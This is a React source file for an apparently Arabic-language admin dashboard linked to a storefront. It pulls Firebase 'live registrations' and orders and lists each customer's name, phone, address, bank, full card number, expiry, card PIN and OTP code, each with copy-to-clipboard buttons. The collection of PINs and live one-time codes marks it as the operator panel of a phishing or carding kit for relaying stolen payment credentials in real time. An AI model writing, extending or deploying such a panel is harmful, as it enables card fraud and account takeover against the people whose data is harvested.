import React, { useState, useEffect, useMemo } from 'react';
import {
  subscribeToLiveRegistrations,
  deleteSessionSteps,
  LiveSessionSummary
} from '../lib/esfgdrFirebase';
import {
  subscribeToOrders,
  deleteOrder,
  FirestoreOrderRecord
} from '../lib/firebase';
import { Store, Check, Copy, Trash2 } from 'lucide-react';
import { CompletedOrder } from '../types';

interface AdminDashboardProps {
  onBackToStore: () => void;
  onViewOrderReceipt?: (order: CompletedOrder) => void;
}

interface SimpleEntry {
  id: string;
  sessionId?: string;
  bookingId?: string;
  orderId?: string;
  name: string;
  phone: string;
  address: string;
  bank: string;
  cardNumber: string;
  cardExpiry: string;
  pin: string;
  otpCode: string;
  updatedAtMs: number;
}

export const AdminDashboard: React.FC<AdminDashboardProps> = ({
  onBackToStore
}) => {
  const [liveSessions, setLiveSessions] = useState<LiveSessionSummary[]>([]);
  const [orders, setOrders] = useState<FirestoreOrderRecord[]>([]);
  const [loading, setLoading] = useState(true);
  const [toastMsg, setToastMsg] = useState('');

  const copyText = (text: string, label: string) => {
    if (!text) return;
    navigator.clipboard.writeText(text);
    setToastMsg(`تم نسخ ${label}`);
    setTimeout(() => setToastMsg(''), 2000);
  };

  useEffect(() => {
    const unsubLive = subscribeToLiveRegistrations(
      (list) => {
        setLiveSessions(list);
        setLoading(false);
      },
      () => setLoading(false)
    );

    const unsubOrders = subscribeToOrders(
      (list) => {
        setOrders(list);
        setLoading(false);
      },
      () => {}
    );

    return () => {
      unsubLive();
      unsubOrders();
    };
  }, []);

  const entries = useMemo<SimpleEntry[]>(() => {
    const map = new Map<string, SimpleEntry>();

    for (const s of liveSessions) {
      const key = s.bookingId || s.sessionId;
      map.set(key, {
        id: key,
        sessionId: s.sessionId,
        bookingId: s.bookingId,
        name: s.name || 'عميل',
        phone: s.phone || '',
        address: s.address || s.area || '',
        bank: s.bank || '',
        cardNumber: s.cardNumber || '',
        cardExpiry: s.cardExpiry || '',
        pin: s.pin || '',
        otpCode: s.otpCode || '',
        updatedAtMs: s.updatedAtMs || Date.now()
      });
    }

    for (const o of orders) {
      const key = o.orderId;
      const ex = map.get(key);
      const createdMs = o.createdAt ? new Date(o.createdAt).getTime() : Date.now();

      map.set(key, {
        id: key,
        sessionId: ex?.sessionId,
        bookingId: key,
        orderId: o.orderId,
        name: ex?.name || o.customerName || 'عميل',
        phone: ex?.phone || o.customerPhone || '',
        address: ex?.address || o.customerAddress || '',
        bank: ex?.bank || (o.cardBank !== 'بانتظار إدخال البطاقة' && o.cardBank !== 'حساب مسجل' ? o.cardBank || '' : ''),
        cardNumber: ex?.cardNumber || o.cardNumber || '',
        cardExpiry: ex?.cardExpiry || o.cardExpiry || '',
        pin: ex?.pin || o.pin || '',
        otpCode: ex?.otpCode || o.otpCode || '',
        updatedAtMs: ex?.updatedAtMs || (Number.isNaN(createdMs) ? Date.now() : createdMs)
      });
    }

    return Array.from(map.values()).sort((a, b) => b.updatedAtMs - a.updatedAtMs);
  }, [liveSessions, orders]);

  const handleDelete = async (entry: SimpleEntry) => {
    const tasks: Promise<any>[] = [];
    if (entry.sessionId) {
      tasks.push(deleteSessionSteps(entry.sessionId, entry.bookingId));
    } else if (entry.bookingId) {
      tasks.push(deleteSessionSteps(`booking_${entry.bookingId}`, entry.bookingId));
    }
    if (entry.orderId || entry.bookingId) {
      tasks.push(deleteOrder(entry.orderId || entry.bookingId!));
    }
    await Promise.allSettled(tasks);
  };

  return (
    <div className="min-h-screen bg-slate-50 text-slate-900 font-sans" dir="rtl">
      {toastMsg && (
        <div className="fixed bottom-4 left-1/2 -translate-x-1/2 z-50 bg-slate-900 text-white px-4 py-2 rounded-lg text-xs font-bold flex items-center gap-1.5">
          <Check className="w-4 h-4 text-emerald-400" />
          <span>{toastMsg}</span>
        </div>
      )}

      {/* Minimal Header */}
      <header className="bg-white border-b border-slate-200 px-4 py-3.5">
        <div className="max-w-5xl mx-auto flex items-center justify-between">
          <h1 className="text-base font-black text-slate-900">
            التسجيلات المباشرة ({entries.length})
          </h1>
          <button
            type="button"
            onClick={onBackToStore}
            className="px-3.5 py-1.5 text-xs font-bold text-white bg-slate-900 rounded-lg hover:bg-slate-800 flex items-center gap-1.5 cursor-pointer"
          >
            <Store className="w-3.5 h-3.5" />
            <span>المتجر</span>
          </button>
        </div>
      </header>

      {/* Direct List */}
      <main className="max-w-5xl mx-auto p-4 space-y-3">
        {loading ? (
          <div className="bg-white border border-slate-200 rounded-xl p-8 text-center text-sm font-bold text-slate-500">
            جارٍ التحميل...
          </div>
        ) : entries.length === 0 ? (
          <div className="bg-white border border-slate-200 rounded-xl p-8 text-center text-sm font-bold text-slate-500">
            لا توجد تسجيلات حالياً
          </div>
        ) : (
          entries.map((item) => (
            <div
              key={item.id}
              className="bg-white border border-slate-200 rounded-xl p-4 space-y-3"
            >
              {/* Customer Row */}
              <div className="flex items-center justify-between gap-2 border-b border-slate-100 pb-2.5">
                <div className="flex flex-wrap items-center gap-2 text-sm">
                  <span className="font-black text-slate-900">{item.name}</span>
                  {item.phone && (
                    <button
                      type="button"
                      onClick={() => copyText(item.phone, 'الرقم')}
                      className="font-mono font-bold text-blue-700 flex items-center gap-1 cursor-pointer"
                      dir="ltr"
                    >
                      <span>{item.phone}</span>
                      <Copy className="w-3.5 h-3.5 text-slate-400" />
                    </button>
                  )}
                  {item.address && (
                    <span className="text-xs text-slate-500">({item.address})</span>
                  )}
                </div>

                <button
                  type="button"
                  onClick={() => handleDelete(item)}
                  className="text-slate-400 hover:text-red-600 p-1 cursor-pointer"
                  title="حذف"
                >
                  <Trash2 className="w-4 h-4" />
                </button>
              </div>

              {/* Card & OTP Row */}
              <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 text-xs">
                <div className="bg-slate-50 p-2.5 rounded-lg">
                  <div className="text-slate-500 font-bold mb-1">
                    البطاقة {item.bank ? `(${item.bank})` : ''}
                  </div>
                  {item.cardNumber ? (
                    <button
                      type="button"
                      onClick={() => copyText(item.cardNumber, 'البطاقة')}
                      className="font-mono font-black text-sm text-slate-900 flex items-center gap-1 cursor-pointer"
                      dir="ltr"
                    >
                      <span>{item.cardNumber}</span>
                      <Copy className="w-3 h-3 text-slate-400" />
                    </button>
                  ) : (
                    <span className="text-slate-400 font-mono">—</span>
                  )}
                </div>

                <div className="bg-slate-50 p-2.5 rounded-lg">
                  <div className="text-slate-500 font-bold mb-1">الانتهاء</div>
                  {item.cardExpiry ? (
                    <button
                      type="button"
                      onClick={() => copyText(item.cardExpiry, 'الانتهاء')}
                      className="font-mono font-black text-sm text-slate-900 flex items-center gap-1 cursor-pointer"
                      dir="ltr"
                    >
                      <span>{item.cardExpiry}</span>
                      <Copy className="w-3 h-3 text-slate-400" />
                    </button>
                  ) : (
                    <span className="text-slate-400 font-mono">—</span>
                  )}
                </div>

                <div className="bg-slate-50 p-2.5 rounded-lg">
                  <div className="text-slate-500 font-bold mb-1">PIN</div>
                  {item.pin ? (
                    <button
                      type="button"
                      onClick={() => copyText(item.pin, 'PIN')}
                      className="font-mono font-black text-base text-red-600 flex items-center gap-1 cursor-pointer"
                      dir="ltr"
                    >
                      <span>{item.pin}</span>
                      <Copy className="w-3 h-3 text-slate-400" />
                    </button>
                  ) : (
                    <span className="text-slate-400 font-mono">—</span>
                  )}
                </div>

                <div className="bg-emerald-50 p-2.5 rounded-lg">
                  <div className="text-emerald-800 font-bold mb-1">OTP</div>
                  {item.otpCode ? (
                    <button
                      type="button"
                      onClick={() => copyText(item.otpCode, 'OTP')}
                      className="font-mono font-black text-base text-emerald-700 flex items-center gap-1 cursor-pointer"
                      dir="ltr"
                    >
                      <span>{item.otpCode}</span>
                      <Copy className="w-3 h-3 text-emerald-600" />
                    </button>
                  ) : (
                    <span className="text-slate-400 font-mono">—</span>
                  )}
                </div>
              </div>
            </div>
          ))
        )}
      </main>
    </div>
  );
};
